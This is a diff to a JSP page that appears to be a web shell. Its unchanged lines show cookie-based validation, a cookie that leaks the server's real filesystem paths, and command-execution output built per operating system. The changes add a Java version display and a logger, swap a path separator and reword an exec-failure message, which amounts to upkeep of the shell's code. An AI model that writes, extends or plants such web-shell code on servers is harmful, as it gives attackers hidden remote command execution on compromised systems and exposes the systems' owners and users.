@@ -1,6 +1,7 @@
 <%@ page language="java" import="java.util.*" import="java.io.*"
 	import="java.net.*" import="java.util.regex.*"
 	import="java.security.MessageDigest" import="sun.misc.BASE64Decoder"
+    import="java.util.logging.*"
 	pageEncoding="UTF-8"%>
 <%
 	String path = request.getContextPath();
@@ -23,6 +24,8 @@
 </head>
 
 <body>
+    <div>java version: <%=System.getProperty("java.version")%></div>
+    <% Logger logger=Logger.getLogger(this.getClass().getName());%>
 	<%!private boolean validateCookie(String aStr) {
 		if (aStr == null || aStr.length() == 0 || aStr.equals("null")) {
 			return false;
@@ -105,7 +108,7 @@
 			if (firstSign) {
 				aCookie = new Cookie("rlp", "`"
 						+ application.getRealPath(request.getRequestURI())
-						+ "," + application.getRealPath("/") + "`");
+						+ ":" + application.getRealPath("/") + "`");
 				response.addCookie(aCookie);
 			}
 
@@ -255,7 +258,7 @@
 					}
 				}
 			} else {
-				commandout.append(osName + ": run exec failure.\n");
+				commandout.append(osName + ": run failure.\n");
 			}
 			out.println(commandout.append(end).toString());
 		}
